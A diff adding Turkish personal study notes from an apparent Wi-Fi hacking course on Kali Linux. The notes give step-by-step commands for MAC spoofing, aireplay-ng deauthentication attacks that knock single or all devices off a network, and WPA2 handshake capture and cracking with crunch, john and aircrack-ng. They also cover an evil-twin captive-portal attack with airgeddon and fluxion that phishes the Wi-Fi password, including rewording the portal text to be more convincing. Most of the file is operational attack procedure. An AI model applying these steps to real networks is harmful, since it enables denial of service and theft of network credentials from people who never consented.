@@ -1,0 +1,2030 @@
+lokal networkdeki cihazlar birbirine mac adresleri aracılığıyla paket yollayıp iletişime geçerler 
+mac adresimiz bizim hangi ağ interfaceinin fiziksel kartının üreticisinin o donanım için belirlemiş olduğu bir adrestir (wireless-ethernet vs) 
+vm de kali makinamızın settings > network kısmında attached to : bridge adapter  name.wireless-kartımızın-ismi şeklinde seçiyoruz 
+yani usb wifi karttan networkümüzü kullnacağız kaliyi açtığımızda ifconfig çalıştırıyoruz gelen çıktıda wlan0 satırının olduğunu görüyoruz 
+bu usb wifi kartımızın bağlı olduğu anlamına gelir kalinin sağ üatteki ağ ikonuna tıklıyoruz Wired Connected kısmına geliyoruz Turn Off diyoruz 
+bunu yapmamızın sebebi ileride bir kafa karışıklığı oluşturmasın diye ardından kali terminaline gelip macchanger --random wlan0 çalıştırıyoruz 
+hata verdid çünkü değiştirme işlemi öncesi wlan0 yu devre-dışı (down durumuna almamız gerekiyor) ifconfig wlan0 down çalıştırıyoruz 
+daha sonra az önce çalıştırdığımız komutun aynısını macchanger --random wlan0 çalıştırıyoruz gelen çıktıda current mac , permanent mac satırlarındaki 
+değerlerin farkı ne araştır buraya yaz bu çıktıda New MAC: satırındaki değer bizim yeni / değişen MAC adresimizdir (mac değiştikten sonra
+ağ içindeki başka bir cihazdan değişmeyen mac adresimizle iletişim kurmaya çalışsak ne olur bunu öğren buraya yaz mac adresi kullanarak aynı 
+ping 192.168.1.100 eklindeki gibi bir işlem var mı mac adreslerinde bunu öğren ping atılırken mac adresi yazarsak çalışır mı öğren)
+ardından ifconfig wlan0 up çalıştırarak wifi yi etkinleştiriyoruz tekrar ifconfig çalıştırırsak değişmiş mac adresimizi gelen çıktıda wlan0 
+satırının altında ether satırındaki txqueulen kelimesine kadar olan 6a:40:nn:af:7b:e0 (örnek) gibi olan değer bizim yeni mac adresimizdir
+fakat macchanger ile değiştirmeye çalıştığımızda başarısız olduğumuz durumlar olabiliyor kali terminalde service network-manager restart komutu 
+nu açlıştırarak ağ hizmetine reset atıp yeniden başlattığımızda tekrar ifconfig çalıştırdığımızda wlan0 da eski mac adresimize dönmüş olduğumuzu 
+görüyoruz yeni bir yöntem öğrenelim şimdi mac değiştirirken kullanabileceğimiz tabii bunu yapmadan önce wlan0 yu down yapmamız gerekiyor 
+ifconfig wlan0 down çalıştırıyoruz ifconfig wlan0 hw ether 00:44:55:66:77:88 çalıştırıyoruz ardından ifconfig wlan0 up çalıştırıyoruz 
+son olarak ifconfig çalıştırdığımızda wlan0 > ether kısmında mac adresimizin 00:44:55:66:77:88 olduğunu görüyoruz (değiştirirken yazdığımız 
+hw = hardware = donanım anlamına gelir)
+
+bu dersimizde Wi-Fi deauthentication attack ı öğrenelim (yetkisizlendirme saldırısı) herhangi bir modeme/ağa bağlı değilken airodump gibi
+ toolların sayesinde saldırı yapmak istediğimiz cihazın mac adresini biliyorsak bu cihazın ağa olan erişimini sonlandırabiliriz ama ağa bağlı 
+ olan ve ağdan koparmak istediğimiz cihazın mac adresini bilmiyorsak ağ trafiğini izlerken o cihazın modelinin vs bilgilerini elde edemeyiz 
+ deauthentication paketleri yollayarak istediğimiz cihazları ağdan kopartabiliriz bu uygulamamızda saldırımızı ağa bağlı olan bir cihaz üstünden 
+ yapalım kali terminalimize gelip airmon-ng start wlan0 çalıştırıyoruz bu komut ile monitör moda geçiş yapıyoruz iwconfig çalıştırıyoruz 
+ wlan0mon satırında Mode:Monitor olduğunu görüyoruz bu modda istediğimiz bir ağın trafiğini / giden-gelen paketleri izlememizi sağlar 
+ airodump-ng wlan0mon çalıştırıyoruz bu komutla etrafımızdaki modemleri listeliyoruz çıktı olarak eğer gelen çıktılar çok fazla ise ctrl+c 
+ ye basıp gelen çıktıları durduruyoruz ardından airodump-ng --bssid modemimizinbulunduğu satırın bssid sütunundaki değer (MAC adresi=bssid)
+ yani modemimizin mac adresi --channel aynı satırdaki CH sütunundaki değeri yazıyoruz en son olarak wlan0mon yazıp çalıştırıyoruz 
+
+ airodump-ng --bssid modemin-mac-adresi --channel CH-değeri wlan0mon çalıştırdıktan sonra gelen çıktıd bu ağa bağlı olan cihazların mac adreslerini 
+ görüyoruz 2 bölümden oluşan bir çıktı aldık en üstteki BSSID sütunu ile başlayan altında tek bir satıra sahip olan 1. kısımdaki bilgi modemin 
+ bilgileridir ENC sütununda ağın/modemin şifreleme yöntemi alltaki 2. kısımda da BSSID ile başlayan bölümde de bu modeme/ağa bağlı olan cihazların 
+ yine aynı sütunlar ile katogorilendirilmiş olan özelliklerini/bilgilerini görebiliyoruz 2. bölümde BSSID sütununda hep modemin mac adresi yazılıdır 
+ dikkat edilirse her satırda bu değer aynıdır STATION sütunundaki değerler de bu modeme bağlı olan cihazların mac adresleridir 
+ peki hangi cihazın bizim cep telefonumuz olduğunu nasıl bulacağız/emin olacağız birinci yöntem deneme yanılma yoluyla bunu yapabiliriz 2. yöntem de 
+ telefonumuzdan tarayıcıdan bir siteye tıklayalım kaliye terminaline döndüğümüzde satırlardan birinde Frames sütunundaki değerin çok hızlı bir şekilde 
+ arttığını görüyoruz buradan analayabiliriz ama eğer ağda aktif olan birden fazla cihaz varsa bunu bulmak için mecburen deneme yanılma yöntemini 
+ kullanmamız gerekiyor ardından ctrl+c ile yaparak bu trafiği izleme işlemini durdurduk terminalden aireplay-ng --deauth 10000 -a modemin-mac-adresi
+ -c telefonun-mac-adresi wlan0mon  çalıştırıyoruz (buradaki -a = access point [erişim noktası=modem] -c=client yani istemci yani modeme bağlan
+ ma isteğinde bulunan saldıracağımız telefon cihazımız) gördüğümüz gibi saldırıya başladık saldırı devam ederken telefonumuzdan internete erişmeye
+ bir siteye girmeye veya internette bir şeyler yapmaya çalıştığımızda bağlanamadığımızı görüyoruz 
+
+
+bu dersimizde birden fazla cihazı yetkisizlendirme konusunu öğrenelim 
+monitor modda iken airodump-ng --bssid modemin-mac-adresi --channel CH-değeri wlan0mon çalıştırıyoruz bu çalışırken new tab dan yeni bir 
+terminal penceresi açıyoruz yeni açtığımız tab de aireplay-ng deauth 10000 -a modemin-mac-adresi -c telefonun mac-adresi wlan0mon &> /dev/null&
+çalıştırıyoruz ve ekrana [1] 4289 gibi bir çıktı / numara bastırıldı burada komutu çalıştırırken yazdığımız & karakteri ile komuttaki işlemimizi 
+arkaplanda çalıştırdık ve komutun çıktısını /dev/null& isimli bir dosyaya (dosya mı yoksa sistemdeki boş bir alan mı buraya yönlendirdik araştır 
+hangisiyse buraya yaz) gelen çıktıdaki 4289 da bu arkaplanda çalışan işlemimizin / proccess imizin PID si (proccess id si) 
+şimdi çalışıp laçılmadığını doğrulamak için telefonumuzdan internete erimeye çalışıyoruz yetkisizlendirme işlemimiz terminalde değil de arkaplan 
+proccess i olarak başlatıldığı için bunu terminali kapatarak sonlandıramayız proccess kill yapmamız gerekiyor -bunu windowsda görev yöneticisinden bir 
+işlemi sonlandırmak gibi düşünebiliriz- şimdi aynı kodu bir de yetkisizlendirmek istediğimiz diğer cihazın mac adresini yazarak yapalım 
+aireplay-ng deauth 10000 -a modemin-mac-adresi -c cihaz2-mac-adresi wlan0mon &> /dev/null& bu komutu çalıştırdıktan sonra aldığımız çıktı
+[2] ile başlar çünkü bu arkplanda çalıştırdığımız 2. süreçtir ilk açtığımız tabda ağda yetkisizlendirdiğimiz cihazlarımızın frame sütunundaki 
+değerlere baktığımızda sürekli arrtığını görüyoruz bu değerlerin artması onlara gönderilen deauth paketleri yüzündendir 
+
+peki arkaplanda çalışan süreçleri(proccess) leri görmek istersek ne yapmalıyız bunun için terminalde jobs komutunu çalıştırırız 
+ve aldığımız çıktıda cihazlarımızın mac adreslerini ve bu süreçleri çalıştırdığımız komutu görebiliyoruz son sütunda 
+eüer bu arkaplan süreçlerinden herhangi birini sonlandırmak için kill %2 dersek ikinci süreci sonlandırırız 
+tekrar job çalıştırırsak aldığımız çıktıda [2]+Terninate yani ikinci proccess in sonlandırıldığını görüyoruz 
+eğer bütün işlemleri sonlandırmak istersek killall aireplay-ng çalıştırıyoruz (sadece killall yazarsak BÜTÜN süreçler mi sonlandırılırdı yoksa hata 
+mı alırdık? burada sonuna aireplay-ng yazmamızın sebebi aldığımız çıktıların 2. sütununda her iki sürecimizin de ismi aireplay-ng idi o yüzden)
+
+
+şimdi tüm cihazları ağdan kopartma uygulamasını öğrenelim ama bu saldırı çok etkili değildir 1 veya 2 cihaza yetkilendirme saldırısı yaparsak 
+bunun başarılı olma ihtimali daha yüksek ancak ağdaki bütün cihazları ağdan kopartma saldırısı her zaman başarılı olmayabilir belki bir yavaşla
+maya sebep olabilir ancak hepsini ağdan kopartmamız düşük bir ihtimaldir 
+
+2 adet terminal ekranı açıyoruz bir tanesinde airodump-ng --bssid modemin-mac-adresi --channel CH-değeri wlan0mon çalıştırarak ağ trafiğini 
+izliyoruz daha sonra 2. terminal ekranında aireplay-ng --deauth 10000 -a modemin-mac-adresi wlan0mon çalıştırıyoruz ve bütün modeme paket yolluyor 
+(yoksa modemdeki bütün  cihazlara mı paket yolluyor bunu araştır gör ) bu komutu çalıştırdığımızda no such bssid available hatası alabilriiz 
+eğer bu hatayı alırsak bu işkemi ctrl+c ile durdururuz ve başka bir terminal tabında az önce çalıştırdığımız 
+airodump-ng --bssid modemin-mac-adresi --channel CH-değeri wlan0mon komutunu çalıştıralım airodump-ng çalışırken bu ağ izleme işlemi bir terminalden 
+çalışırken aynı anda başka bir terminalde aireplay-ng --deauth 10000 -a modemin-mac-adresi wlan0mon çalıştırırsak böyle bir hata almayız 
+bütün ağa saldırdığımız durumların dışında diğer 1 veya 2 cihaza saldırırken de channel karışıklığı vs gibi durumlar olduğundan bu saldırıyı 
+yapmadan önce her zaman diğer bir terminalde airodump ı çalıştırmak faydalı olacaktır şimdi telefonumuzdan ve ağa bağlı olan diğer cihazlarımızdan 
+internete girmeye çalışıyoruz ancak internete erişimimiz olmadığını görüyoruz 
+
+bu dersimizde faydalı bazı linux komutlarını öğrenelim uname -a komutu ile kullanmış olduğumuz linux dağıtımının ve bu dağıtımın versiyon sürümü 
+nü ekrana bastırabiliriz terminalde çalıştırarak 
+
+başka bir komut olan history yi terminalde çalıştırdığımızda ise daha önce yazmış olduğumuz son 1000 komutu ekrana bastırır (sayıyı emin ol ona 
+göre burada değişiklik yap veya onayla) cd /Documents çalıştırıyoruz ardından touch atilsam çalıştırarak uzantısız atilsam isminde bir dosya 
+oluşturuyoruz ls -l yaparak içinde bulunduğumuz dizindeki bütün dizin ve klasörlerin rwx şeklinde harflendirilerek oluşturulan izinlerini 
+kullanıcı ve grup izinlerini  ekrana bastırabiliriz (kullanıcı ve grup izinlerinin sağındaki hemen bir sonraki sütundaki değer dosya boyutu mu?)
+(buradaki tarih ve saat bilgisi neyi ifade ediyor ve en sondaki sütunun altındaki değerler dosya ismini mi ifade ediyor bunu öğren buraya yaz)
+
+ls -l atilsam çalıştırarak spesifik bir dosya için de bu çıktıları alabiliriz chmod bir dosyanın veya klasörün izinlerini dğeiştirmek için kullanılır 
+
+cat /etc/passwd çalıştırarak sistemimizdeki bütün kullanıcı ve grupların çıktısını alabiliriz atilsam ın bulunduğu dizinde iken terminalde 
+chmod 700 atilsam çalıştırdığımızda ls -l atilsam çalıştırırsak -rwx------ çıktısını görüyoruz bunun anlamı izin değerlerinde 7 nin 
+hem okuma hem yazma hem de çalıştırma yetkisini temsil ettiği için harflendirme de böyle bir çıktı aldık diğer kısımların tamamı ----- şeklinde 
+boştur çünkü 700 değerini verdik ve onlara 0 0 olarak değer verdik -dosyanın ait olduğu gruba ve others a- baştaki - karakteri de ilgili dosyanın 
+bir dosya olduğunu ifade eden (- karakterini içerir) atilsam = directoy / klasör olsaydı drwx------ şeklinde bir çıktı alacaktık başındaki d = 
+directory kelimesini ifade eder şimdi de atilsam in sahipliğini (owner) ve ait olduğu grubu değiştirelim bunun için de chown komutunu kullanıyoruz 
+
+bu komutun anlamı change ownerhip (sahipliği değiştirmek anlamına gelir) chown sys:sys atilsam (chown owner-olacak-kullanıcı-:ait-olacağı-grup dosyaismi)
+ardından ls -l çalıtırdığımızda owner ve group kısmının dğeiştirildiğini görüyoruz 
+
+terminalde /Documents in içerisindeyken cp atilsam /root/Downloads/ çalıştırdığımızda atilsam isimli dosyaızı /root/Downloads/ dizinine kopyalar 
+yine Documents dizinindeyken mv atilsam /root/Downloads/ çalıştırırsak ilgili dosyamızı downloads dizinine TAŞIMIŞ oluruz 
+ardından cd /root/Downloads > rm atilsam çalıştırarak dosyamızı silebiliriz eğer bir klasör silmek istersek rm -rf klasörismi (silmek için 
+o klasörün bulunduğu dizinde mi olmamız gerkeiyor terminalde?) çalıştırarak da bir klasör silebiliriz 
+
+ifconfig < grep -i inet çalıştırdğımızda ifconfig komutunu çalıştırdığımızda gelen çıktılar arasından sadece inet ifadesinin geçtiği SATIRLARIN 
+(inet ifadesi geçen satırın TAMAMINI) ekrana bastıracaktır 4 adet satır çıktı olarak getirildi 
+
+BU DERSİMİZDE WPA2 ŞİFRELERİNİ KIRMAYI ÖĞRENELİM 
+
+şimdi handshake yakalama işlemi nasıl oluyordu ve küçük bir wordlist saldırısı nasıl yapılıyordu bunu hatırlayalım 
+kali terminalimize gelip airmon-ng start wlan0 çalıştırarak monitor moda geçiyoruz ardından airodump-ng wlan0mon çalıştırarak 
+etrafımızdaği ağların internet trafiğini izleyelim ardından listede kendi ağımızı gördükten sonra ctrl+c ile izleme işlemini durduruyoruz
+airodump-ng --bssid modemimizin-bssidsi --channel modemin-hangi-channelda-olduğunu (eğer 7 ise --channel 7 yazacağız) --write handshake-test 
+wlan0mon çalıştırıyoruz ve işlemimiz başladı şimdi handshake yakalamamaız için yeni bir cihazın modeme bağlanmasını bekleyebiliriz 
+public wifi ağlarnda bu  oldukça olası çünkü 1 dakikanın altında belki birdn fazla cihaz ağdan ayrılıp ağa katılabiliyor / dahil olabiliyor 
+ancak local networklerde bu pek mümkün olmuyor genellikle bir def ağa bağlanıldıktan sonra network ayarlarından beni unut diyip tekrar 
+bağlanılmadığı sürece yıllarca o ağa bağlı kalınabiliyor 
+
+o yüzden deauthentication metodunu kullanmamız gerekiyor yeni bir terminal tabında aireplay-ng --deauth 10 -a kendi-macimiz -c hedef-mac 
+(buradaki mac adreslerini bir önceki terminalde çalışan işlemdeki tablodn alabiliriz ancak bssid sütunundaki değeri kopyalamayacağız 
+çünkü o modemin mac adresi station sütunundaki değeri kopyalayıp kodumuza yapıştıracağız) wlan0mon çalıştırıyoruz kodumuzda 10 gibi çok 
+küçük bir paket sayısı belirttik çünkü hedefimizin ağa onun hiç farkında bile olmayacağı kadar kısa süre içerisinde ağdan kopmasını 
+ve geri bağlanmasını, bağlanırken de handshake hash ini modemden talep ederken o hash i bizim yakalamamızı istediğimiz içindir 
+ve hash i yakaladık ilk açtığımız terminalde ilk satırın sonunda ][ WPA handshake: D0:6F:82:74:6B:AA şeklinde olan değer bizim handshake imizin 
+hashidi (hashi midir hash ise hangi algoritma ile hashlenmiştir eğer bu mac adresi ise kimin mac adresi neden handshake bir mac adresi bunun mantığını 
+anla buraya yaz)
+
+şimdi crunch toolumuzu çalıştıralım yeni açtığımız terminale gelip clear çalıştırıyoruz crunch 8 9 xy123 -o wordlist  çalıştırıyoruz 
+crunch toolu ile 8 veya 9 karakterli bir şifre oluşturmasını ve bu şifrelerin de x y 1 2 3 karakterlerinin matematiksel bütün kombinasyonlarını 
+içeren bir şekilde wordlist isimli bir dosyaya kaydetmesini istedik ardından 
+
+yeni açtığımız terminalde aircrack-ng handshake-file handshake-test-01.cap -w wordlist çalıştırıyoruz ve handshake hashini bizim wordlist 
+dosyamızın içerisindeki şifreler le deneyecek (kod içerisinde handshake-test-01.cap dosyası bizim handshake hash ini yakaladıktan sonra hash i 
+kaydettiğimiz / toolun kaydettiği dosyanın ismi /aircrack komutunun wordlist ve handshake dosyasının olduğu dizinde mi çalıştırmamız gerekiyor 
+terminalde bunu öğren/dene buraya yaz) 
+
+ve şifremizi buldu aircrack işleminin yapıldığı terminalde helen çıktılar arasında KEY FOUND ! [xxxyy123] bizim şifremizin clear halidir 
+biz zaten şifreyi bildiğimiz için çokhızlı bir şekilde kırdık (şifre kırma işlemini başarıyla gerçekleştirmek için şifremizin wordlistin içerisinde 
+olduğundan emin olmamız gerekiyor)
+
+bu dersimizde John toolunun nasıl kullanıldığını öğrenelim kali terminalimize gelip crunch 8 9 abcdefgxy1234 -o wordlist2 çalıştırıyoruz 
+ve bu oluşturacağı dosya 204GB boyutuda olduğu ve bilgisayarda bu kadar yer olmadığı için kodumuzu biraz değiştiriyoruz 
+crunch 8 9 abhxy1234 -o wordlist çalıştırıyoruz ve oluşacak dosyanın boyutunun kodu çalıştırdıktan sonra gelen çıktının 3. satırındaki 3 GB
+lık bir değer olduğunu görüyoruz ardından aircrack-ng handshake-test-01.cap -w wordlist çalıştırıyoruz işlem başladıktan sonra 
+Time Left: satırındaki değerde işlemin tamamlanmasının ne kadar süreceğini görebiliyoruz bizde 4 days / 4 gün süreceği için ctrl+c yapıp clear
+çalıştırıyoruz aircrack toolunda şifre deneme işlemi başlatıldığında pause / resume işlemlerini yapamıyoruz böyle bir özelliğe sahip değil 
+
+bu yüzden John isimli bir toolu kullanacağız çünkü john toolunda bu özellikler var 
+kali terminalimize gelip john --wordlist=wordlist2 --stdout çalıştırıyoruz ve crunch ile oluşturduğumuz wordlist2 dosyasının içeriğini terminalimize 
+çıktı olarak aktığını görüyoruz ctrl+c ile bu işlemi durduruyoruz çünkü çok uzun sürecek 
+
+bu dersimizde jack toolunda çalıştırdığımız işlemin outputunu | (pipe) ile alıp aircrack-ng tooluna input olarak verelim 
+
+kali terminalimize gelip
+ john --wordlist=wordlist2 -stdout --session=james | aircrack-ng -w - -b modemin-mac-adresi handshake-test-01.cap çalıştırıyoruz 
+ ve şifreleri deneme işlemimiz başladı q tuşuna basarak bu işlemi durduruyoruz şimdi amacımız kodun içerisinde --session=james yazarak 
+ açmış olduğumuz james isimli oturumda şifre denemesini pause ettiğimizde tekrar deneme işlemine devam etmek istediğimiz zaman en baştan 
+ başlamak yerine kaldığımız yerden devam etme özelliğini kullanmaya çalışacağız bunun için kali terminalimizde 
+ john --restore=james | aircrack-ng -w - -b modemin-mac-adresi handshake-test-01.cap çalıştırdığımızda en brute-force işlemine en son durdurduğumuz 
+ şifreden denemeye başladığını görebiliriz 
+ (kodumuzdaki -w den sonraki - (kısa çizgisi)john dan pipe edilen outputu ilgili işlemde yani worlist seçme işleminde kullanılmasını ifade eder)
+
+ bu dersimizde brute force işlemi yaparken çok büyük wordlistlerle çalışma konusunu öğrenelim 
+ crunch da kombinasyonları belirlediğimiz şifreleri bir dosyaya kaydetmeden pipe ile aircrack-ng de çalıştırabiliriz bunun için 
+ kali terminalimize gelip crunch 8 8 | aircrack-ng -w - -b modemin-mac-adresi handshake-test-01.cap (burada 8 karakterli olası bütün harf ve 
+ sayıların içine dahil olduğu 1tb dan daha büyük boyuta sahip olan dosyayı ifade eder)
+
+ bu dersimizde crunch ile oluşturduğumuz şifreleri önce john a input olarak okutacağız daha sonra okuttuğumuz bu verileri aircrack de kullanacağız 
+ yani kısaca çok büyük wordlistleri bilgisayarımızda yer kaplamadan brute-force saldırımızı deneyeceğiz 
+
+ bunun için kali terminalimize 
+ crunch 8 8 | john --stdin --session=lars --stdout | aircrack-ng -w - -b modemin-mac adresi handshake-test-01.cap yazıp çalıştırıyoruz 
+ ve amacımız olan işlemi başlattık bu işlemimizi ctrl+c ile durduruyoruz 
+ şimdi bu işlemimizi yeniden başlattığımızda kaldığımız yerden mi devam edecek bunu görmek için tekrar çalıştıracağız 
+ kali terminalimize gelip  crunch 8 8 | john --restore=lars | aircrack-ng -w - -b modemin-mac adresi handshake-test-01.cap çalıştırıyoruz ve 
+ kaldığımız yerden devam ettiğimizi görüyoruz 
+
+bu dersimizde şeytani ikiz (evil twin) saldırısını öğrenelim bu saldırı kısaca saldırgan tarafınıdan bir şifresini ele geçirmek istediği bir
+ modemin fake/sahte bir clonunu oluşturulup kurbanın halihazırda bağlı olduğu modemden yetkisizlendirme saldırısı ile kopartılıp 
+ kendi oluşturuduğumuz modeme bağlanmasını sağlayıp bağlantı gerçekleştikten sonra kurbanın tarayıcısında daha önce bağlı olduğu modemin 
+ şifresini girmesini istediğimiz bir form doldurup asıl modemimizin şifresini çalmayı öğreneceğiz
+
+ evil twin saldırımızı fluxion isimli bir tool la yapalım ancak bu tool kalinin 2019 sürümünde çalışmayabilir bu yüzde saldırıyı 2020 veya 2021 
+ sürümlerinde gerçekleştirmek daha sağlıklı sonuçlar almamızı sağlayacaktır 
+
+ bu dersimi<de fluxion toolu ile aynı işlemi yapan airgeddon isimli toolun kurulumunu öğrenelim 
+ https://github.com/v1s1t0r1sh3r3/airgeddon bağlantısına gidiyoruz Code yazan yeşil butona tıklıyoruz çılan küçük penceredeki HTTPS tabındaki 
+ https://github.com/v1s1t0r1sh3r3/airgeddon.git bu url yi kopyalıyoruz (güncelleme ile beraber url değişebilir güncel olan bu olduğu için bunu koydum)
+ ardından kali terminalimize geliyoruz cd opt/ çalıştırıyoruz daha sonra genellikle opsiyonel programların kurulu olduğu /opt dizininde iken
+  git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git çalıştırıyoruz (root isek) ardından dosyamız indirildikten sonra cd airgeddon çalıştırıyoruz
+  ./airgeddon.sh çalıştırıyoruz ve toolumuz açılıyor ancak bu toolu cihazımızda ilk defa çalıştırdığımız için toolumuzun çalışması için bilgisa 
+  yarımızda yüklü olması gereken bazı scriptler var bunların olup olmadığını kontrol etmek için enter tuşuna bsıyoruz tool bizim için kontrol 
+  ediyor sırayla gelen çıktıda mavi renkli başlıkta yazan Essential tools: checking... yazısı airgeddon un çalıması için KESİNLİKLE yüklü 
+  olması gereken scriptlerdir bunlar olmazsa toolumuz çalışmayacaktır ancak kali de bu toollar genellikle yüklü olarak gelir zaten 
+  
+  mavi renkli olan Optional tools: kısmı da opsiyonel olarak airgeddon da ki bütün modülleri başarılı bir şekilde çalıştırmak için gerekli 
+  olan scriptlerin kontrol edildiği kısımdır ihtiyacımıza göre airgeddon da farklı modüller çalıştırmak istersek bu opsiyonel kısımdaki scriptleri 
+  yüklememiz gerekir ancak biz şuanki uygulamamızda bunları yüklemeyeceğiz 
+
+  eğer toolun bize sorduğu soruda Y ye basıp enterlarsak essential / optional bütün gerekli olan her şeyi indirir n yazıp enterlarsak indirmeden
+  devam eder ardından 2 defa entera basıp devam ediyoruz (irgeddon un güncel sürümünü kullanıp kullanmadığımızı kontrol ediyor tool)
+ardından açılan ekranda 2 yazıp enterlıyoruz burada wlan üzerinden mi eth üzerinden mi saldırı yapmak istediğimizi soruyor wlan ı seçtik 
+daha sonra açılan kısımda wireless oalrak yapabileceğimiz bütün saldırı çeşitlerini görebiliriz ardından 7 ye basıp enterlıyoruz 
+(evil twin aatacks menu yazana) ardından 2 yazıp çalıştırıyoruz (bu wireless kartımızı monitör moda alır) ardından başarılı bir şekilde 
+monitor moda geçtiğimiz ile alakalı bir çıktı aldık entera basıyoruz ve tekrar hangi wireless saldırısını seçmek istediğimizi sorduğu 
+menüye geldik ancak 2. satırdaki Mode:Monitor kısmı değişti bu monitor modda olduğumuz anlamına gelir ardından 9 yazıp enterlıyoruz 
+(bu seçenekte kullanıcıya bağlı olduğu modemin bir kolonunu oluşturup buraya bağlandıktan sonra asıl bağlı olduğu modemin şifresini; interneti 
+kullanmak için güncelleme yapılması gerekli güncelleme yapmak için bağlı olduğunuz modemin şifresini giriniz gibi sosyal mühendislik yöntemleriyle 
+şifresini almaya yardımcı olan seçenek bu şekilde form yollatıp şifresini girmesini istediğimiz seçeneğin adı=captive portal dır)
+
+ardından enter a basıyoruz tool bize birazdan etraftaki ap trafiğini dinleyeceğini ve saldırı yapacağımız modemin ismini çıktıda gördüğümüz zaman 
+ctrl+c ile izleme / arama işlemini sonlandırmamızı istiyor entera basıyoruz ve sağ üstte küçük bir siyah terminal ekranı açılıyor burada 
+airodump-ng çalıştırılıyor hedef modemimizin ismini ESSID sütununda gördüğümüzde ctrl+c yaparak işlemi durduruyoruz gelen çıktıda 
+modemimizin ismi hangi numarada gözüküyorsa (N. sütunundaki değer) o sayıyı yazıp örneğin 5 yazıp çalıştırıyoruz artık saldıracağımız 
+modemi seçtik burada açılan kısımda hangi aracı / scripti kullanarak deauthentication saldırısı yapmak isteidğimizi söylüyor biz daha önce 
+deneyip çalıştığını bildiğinmiz için 2 yazıp çalıştırarak aireplay ile bu saldırıyı gerçekleştiriyoruz burada DoS isimli bir saldırı 
+yöntemini kullanamk isteyip istemediğimizi soruyor (farklı channel lar üzerinde geçiş yapıp o şekilde bir yetkisizlendirme yapmak ama teknik 
+detay ve sürecini iblmiyorum araştır ve bu konuyu öğren) N yazıp enterlıyoruz tekrar bir soru sordu tool bize bu mac adresimizi değiştirmek 
+ister misiniz sorusudur istemediğimiz için N yazıp enterlıyoruz son olarak bir handshake dosyamızın olup olmadığını soruyor eğer 
+daha önceden airodump-ng yoluyla modemin handshake dosyasını aldıysak tekrar bu işlemi yapmamıza gerek yok ama almadıysak aynı bu örnekte 
+olduğu gibi eğer handshake alma işlemini airgeddon toolu üzerinden yaparken bir problem yaşarsak handshake dosyasını almayı zaten biliyoruz 
+dosyayı airedumo ile manuel alıp daha sonra bu süreçe geldiğimiz zaman y diyerek işlemimize devam edebiliriz (handshake dosyasını aldınız mı 
+almadınız mı diye soruyor) biz n yazıp çalıştırıyoruz (burada saniye türünden bir değer vermemizi istiyor ama anlamadım bu süre neyi ifade ediyor
+burayı araştır buraya yaz) 30 yazıp enterlıyoruz ve ardından gelen çıktının en altındaki satırda aldığı handshake dosyasını 
+/root/handshake-94:FE:22:DA:AC:3D.cap gibi bir dosyaya kaydettiğini söylüyor ardından bu dosyayı belirlenen bu dizine mi yoksa başka bir dizine 
+mi kaydetmek istediğimizi soruyor buraya kaydetme işlemini onaylamak için enter tuşuna basıyoruz ardından handshake dosyasını başarıyla 
+aldığını söylüyor entera basarak devam ediyoruz ardından gelen çıktıda 
+BSSID set to:4:FE:22:DA:AC:3D (saldıracağımız modemin mac i)
+channel set to:1 (saldırı yapılacak channel numarası)
+ESSID set to: salrılacak modemin adı 
+
+şeklinde bilgileri ekrana bastırıyor ve ardından yine gelen çıktının en son satırında [/root/evil_twin_captive_portal_password-Atilzeynep.txt]
+dizinine kurban kullanıcı modeminin şifresini forma submit ettiğinde şifrenin yazdırılacağı dosyanın dizinini belirtiyor bu dizine yazdırmak 
+ister misin diyor enterlıyoruz ve tekrar entera basıyoruz ve bu saldırıyı hangi dilde yapmak istersin diye bir soru alıyoruz 11 (Turkish) 
+i yazıp enterlıyoruz (bu kullanıcımızın karşısına çıkan formun dili) 
+
+bu işlemi başlattıktan sonra ekranda 6 tane pencere açılacak burada pek çok farklı işmeç gerçekleşiriliyor 
+şimdi oluşturduğumuz sahte modeme telefonumuz üzerinden bağlantı kuruyoruz wifi den orijinal modemimiz ile aynı isme sahip olan modemi seçip 
+bağlanıyoruz tarayıcıdan internete erişmek istediğimizde bizi internete bağlanabilmeniz için kablosuz ağ şifrenizi girmelisiniz 
+diye bir input karşılıyor biz buraya gerçek modemimizin şifresini giriyoruz ve eğer girdiğimiz şifre doğruysa ekranda şifre doğru bağlantınız bir kaç 
+dakika içerisinde yeniden gerçekleşecektir yazısı bizi karşılıyor şifremizin doğru olduğunu nasıl anladı peki bunun cevabı saldırıyı başlatmadan 
+önce tanımladığıımz handshake dosyası ile kurbanın girdiği şifreyi karşılaştırdı ve eşleştirdi ve bu sonuca vardı 
+
+saldırıyı yaptığımız bilgisayara geçtiğimizde sağ üstteki pencerede the password was saved on file:
+/root/evil_twin_captive_portal_password-Atilzeynep.txt dizinine şifremizin kaydedildiğini söylüyor 
+ardından bu pencereyi enter a basıp kapatıyoruz kali terminalimize gelip tekrar entera basıyoruz ardından ctrl+c yaparak airgeddon dan çıkabiliriz
+Y yazıp entera basıyoruz daha sonra çıktıktan sonra monitor modda olmaya devam etmek istiyor musun wireless kartının diye bir soru soruyor 
+N yazıp entera basıyoruz ardından root değilsek sudo su çalıştırıp kullanıcımızın şifresini giriyoruz cd / ile root a gidiyoruz 
+cd root çalıştırıyoruz cat evil_twin_captive_portal_password-Atilzeynep.txt çalıştırıyoruz gelen çıktıda Password: satırında şifremiz yazıyor 
+olacaktır 
+
+cd /opt/airgeddon çalıştırıyoruz sudo nano language_strings.sh çalıştırıyoruz bu dosyanın içerisinde captivr portal da kurbanın okuyacağı stringleri 
+değiştirerek daha inandırıcı metinler yazabiliriz değişiklik yaptıktan sonra ctrl+o diyerek kaydedip ctrl+x ile çıkıyoruz 
+
+kali terminalimizi açıyoruz cd /opt çalıştırıyoruz daha sonra git clone https://github.com/FluxionNetwork/fluxion.git çalıştırıyoruz 
+
+ardından cd fluxion > cd install > bash install.sh (bu dosya bir bash scripti olduğu için bash komutu ile çalıştırdık ./dosya-ismi şeklinde de
+ çalıştırabilirizbilir miydik araştır buraya yaz) imleç tekrar terminalimizde yanıp söndüğü zaman fluxion yükleme işlemimiz sona ermiş demektir 
+/opt/fluxion dizinindeyken bash fluxion.bash çalıştırarak fluxion u başlatabiliriz daha sonra 4 yazıp enterlıyoruz
+
+şimdi hangi kanalda yayın yapacağımızı seçmemiz gerkiyor 1 yazıp çalıştırıyoruz (herhangi bir spesifik tercih yapmadan tüm kanallar diyoruz)
+daha sonra beyaz bir pencere açılacak saldıracağımız wifi ekranda gözüktükten sonra ctrl+c yaparak bu beyaz pencereyi kapatabiliriz 
+
